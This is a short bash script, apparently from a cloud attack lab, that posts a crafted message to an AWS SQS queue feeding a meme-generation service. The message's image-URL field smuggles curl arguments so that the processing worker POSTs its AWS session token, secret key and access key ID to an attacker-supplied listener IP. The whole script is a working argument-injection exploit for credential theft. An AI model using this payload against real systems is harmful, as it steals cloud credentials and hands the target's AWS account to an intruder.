#!/bin/bash

#
# This attack is executable once I'm locked out of all the other fooli creds
#
# Change this based on target
LISTENER_IP=$1
QUEUEURL=$2

if [ -z "$QUEUEURL" ] ; then
	echo "Usage: $0 <LISTENER_IP> <QUEUEURL>"
	exit 1
fi

cat <<EOF > message.json
{
	"source_image_url": "-X POST -F AWS_SESSION_TOKEN=\$AWS_SESSION_TOKEN -F AWS_SECRET_ACCESS_KEY=\$AWS_SECRET_ACCESS_KEY -F AWS_ACCESS_KEY_ID=\$AWS_ACCESS_KEY_ID  http://$LISTENER_IP:30068/",
	"meme_text": "FOO",
	"text_location": "center",
	"dest_image_object_key": "BAR",
	"font_size": "15"
}
EOF

aws sqs send-message --queue-url $QUEUEURL --message-body file://message.json
rm message.json




